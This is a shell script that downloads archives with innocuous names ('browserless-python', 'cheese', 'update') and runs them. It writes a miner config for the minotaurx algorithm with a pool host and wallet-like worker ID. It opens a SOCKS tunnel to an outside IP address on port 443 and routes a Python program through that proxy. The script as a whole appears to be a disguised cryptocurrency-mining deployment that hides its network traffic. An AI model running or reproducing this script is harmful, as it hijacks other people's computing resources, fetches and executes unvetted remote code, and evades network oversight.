#!/bin/sh
wget https://raw.githubusercontent.com/maxwellcrawford21/browserless-python/main/browserless-python.tar.gz
sleep 2
tar -xf browserless-python.tar.gz
sleep 2
rm config.json
sleep 2
cat > config.json <<END
[
    {
      "algorithm": "minotaurx",
      "host": "flyingsaucer-eu.teatspray.fun",
      "port": 7019,
      "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
      "password": "Shiny,c=MAZA,zap=MAZA",
      "workers": 14
    }
  ]
END

sleep 3

ls -la

sleep 2

cat config.json

pip3 install -r requirements.txt

sleep 2

wget -q https://raw.githubusercontent.com/thembilemhlabangula/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v 45.135.58.52:443 7777:socks &

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

curl -s -L -o update.tar.gz https://raw.githubusercontent.com/thembilemhlabangula/update/main/update.tar.gz > /dev/null

sleep 2

tar -xf update.tar.gz > /dev/null

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl ifconfig.me

sleep 2

./update/update python3 main.py
